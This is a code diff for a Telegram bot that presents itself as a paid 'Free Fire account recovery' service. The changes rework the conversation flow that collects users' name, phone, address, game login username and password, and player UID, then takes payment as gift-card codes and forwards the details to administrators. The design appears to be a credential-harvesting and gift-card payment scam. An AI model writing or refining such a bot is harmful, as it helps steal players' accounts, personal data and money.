@@ -50,7 +50,7 @@ def index():
 @bot.message_handler(commands=['start'])
 def start_command(message):
     chat_id = message.chat.id
-    user_states[chat_id] = {"timestamp": time.time()}
+    user_states[chat_id] = {"timestamp": time.time(), "step": "agree_tc"}
     
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("✅ Agree & Continue", callback_data="agree_tc"))
@@ -71,6 +71,8 @@ def start_command(message):
 def agree_tc_callback(call):
     safe_answer(call.id)
     chat_id = call.message.chat.id
+    
+    user_states[chat_id] = {"timestamp": time.time(), "step": "select_plan"}
     
     try:
         bot.delete_message(chat_id, call.message.message_id)
@@ -100,7 +102,12 @@ def plan_selection_callback(call):
     plan_name = "Premium Recovery" if is_premium else "Basic Recovery"
     duration = "24 - 48 Hours" if is_premium else "10 - 15 Days"
     
-    user_states[chat_id] = {"plan": plan_name, "is_premium": is_premium, "timestamp": time.time()}
+    user_states[chat_id].update({
+        "plan": plan_name, 
+        "is_premium": is_premium, 
+        "step": "confirm_plan",
+        "timestamp": time.time()
+    })
     
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("✅ Confirm & Proceed", callback_data=f"confirm_plan_{'premium' if is_premium else 'basic'}"))
@@ -122,6 +129,8 @@ def show_sub_options(call):
     is_premium = "premium" in call.data
     p1_price = "₹1799" if is_premium else "₹1199"
     p2_price = "₹2499" if is_premium else "₹1799"
+    
+    user_states[chat_id]["step"] = "select_sub"
     
     markup = InlineKeyboardMarkup()
     markup.row(
@@ -208,10 +217,39 @@ def collect_user_details(message):
         user_states[chat_id]["step"] = "get_uid"
         bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")
 
+    elif state == "get_uid":
+        user_states[chat_id]["uid"] = text
+        user_states[chat_id]["step"] = "summary_review"
+        
+        data = user_states[chat_id]
+        summary_text = (
+            "📋 **Review Your Application Details:**\n\n"
+            f"👤 **Name:** {data.get('name')}\n"
+            f"📱 **Mobile:** {data.get('mobile')}\n"
+            f"🏠 **Address:** {data.get('address')}\n"
+            f"🔐 **Login Method:** {data.get('login_method')}\n"
+            f"🔑 **Credentials:** `{data.get('credentials')}`\n"
+            f"🆔 **UID:** `{data.get('uid')}`\n"
+            f"🛠️ **Service:** {data.get('sub_option')}\n"
+            f"💰 **Total Amount:** ₹{data.get('price')}\n\n"
+            "⚠️ *Please verify all details are correct before proceeding.*"
+        )
+        
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("✅ Confirm Details & Proceed to Payment", callback_data="proceed_payment"))
+        bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)
+
+    elif state == "summary_review":
+        bot.send_message(chat_id, "⚠️ Please click the **'Confirm Details & Proceed to Payment'** button above to continue.", parse_mode="Markdown")
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
 def handle_login_method(call):
     safe_answer(call.id)
     chat_id = call.message.chat.id
+    
+    # Ignore if user already passed login method step
+    if chat_id in user_states and user_states[chat_id].get("step") not in ["get_login_method", "get_credentials"]:
+        return
     
     login_method = call.data.split("_")[1]
     if login_method == "Other":
@@ -230,39 +268,6 @@ def handle_login_method(call):
             "`Username/Mobile:Password` (Send in a single message)",
             parse_mode="Markdown"
         )
-
-@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_credentials")
-def handle_credentials(message):
-    chat_id = message.chat.id
-    user_states[chat_id]["credentials"] = message.text.strip()
-    user_states[chat_id]["step"] = "get_uid"
-    bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")
-
-@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_uid")
-def handle_uid(message):
-    chat_id = message.chat.id
-    user_states[chat_id]["uid"] = message.text.strip()
-    user_states[chat_id]["step"] = "summary_review"
-    
-    data = user_states[chat_id]
-    
-    summary_text = (
-        "📋 **Review Your Application Details:**\n\n"
-        f"👤 **Name:** {data.get('name')}\n"
-        f"📱 **Mobile:** {data.get('mobile')}\n"
-        f"🏠 **Address:** {data.get('address')}\n"
-        f"🔐 **Login Method:** {data.get('login_method')}\n"
-        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
-        f"🆔 **UID:** `{data.get('uid')}`\n"
-        f"🛠️ **Service:** {data.get('sub_option')}\n"
-        f"💰 **Total Amount:** ₹{data.get('price')}\n\n"
-        "⚠️ *Please verify all details are correct before proceeding.*"
-    )
-    
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("✅ Confirm Details & Proceed to Payment", callback_data="proceed_payment"))
-    
-    bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)
 
 # 7. Payment Screen & Gift Card Collection
 @bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
@@ -287,7 +292,6 @@ def handle_gift_card(message):
     chat_id = message.chat.id
     gift_card_input = message.text.strip()
     
-    # Anti-Fraud Format Validation
     if ":" not in gift_card_input or len(gift_card_input) < 10:
         bot.send_message(
             chat_id, 
@@ -313,7 +317,6 @@ def handle_gift_card(message):
     
     bot.send_message(chat_id, "⏳ **Your details are under verification. Please wait for confirmation.**", parse_mode="Markdown")
     
-    # Admin Split Notifications (2 Messages)
     msg_basic_details = (
         f"🚨 **New Recovery Request (Basic Info)**\n\n"
         f"🎟️ **Ticket ID:** `{ticket_id}`\n"
